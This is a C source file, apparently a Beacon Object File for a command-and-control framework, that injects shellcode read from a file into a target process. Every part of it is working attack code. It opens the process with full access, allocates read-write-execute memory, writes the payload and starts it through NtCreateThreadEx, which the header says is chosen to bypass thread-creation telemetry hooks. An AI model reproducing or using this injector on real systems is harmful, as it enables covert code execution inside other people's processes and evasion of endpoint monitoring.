/*
 * bof-injectthread <pid> <shellcode-file>
 *
 * Remote thread injection through NtCreateThreadEx, bypassing the
 * CreateRemoteThread userland path and its thread-creation telemetry hooks.
 * RWX allocation + WriteProcessMemory, then NtCreateThreadEx at the buffer.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int pid;
    char *path;
    int plen = 0;
    unsigned char *sc = NULL;
    unsigned int sclen = 0;
    HANDLE hp, ht = NULL;
    LPVOID remote;
    NTSTATUS st;

    BeaconDataParse(&parser, args, alen);
    pid  = BeaconDataInt(&parser);
    path = BeaconDataExtract(&parser, &plen);
    if (pid <= 0 || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: injectthread <pid> <shellcode-file>\n");
        return;
    }

    if (bof_read_file(path, &sc, &sclen) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "cannot read %s: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    hp = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
    if (!hp) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n", pid,
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    remote = KERNEL32$VirtualAllocEx(hp, NULL, (SIZE_T)sclen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$WriteProcessMemory(hp, remote, sc, (SIZE_T)sclen, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hp);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    st = NTDLL$NtCreateThreadEx(&ht, THREAD_ALL_ACCESS, NULL, hp, remote,
                                NULL, 0, 0, 0, 0, NULL);
    if (st < 0) {
        BeaconPrintf(CALLBACK_ERROR, "NtCreateThreadEx failed: 0x%08lx\n",
                     (unsigned long)st);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %u bytes -> PID %d, thread created at 0x%p\n",
                     sclen, pid, remote);
        KERNEL32$CloseHandle(ht);
    }

    KERNEL32$CloseHandle(hp);
    KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
}
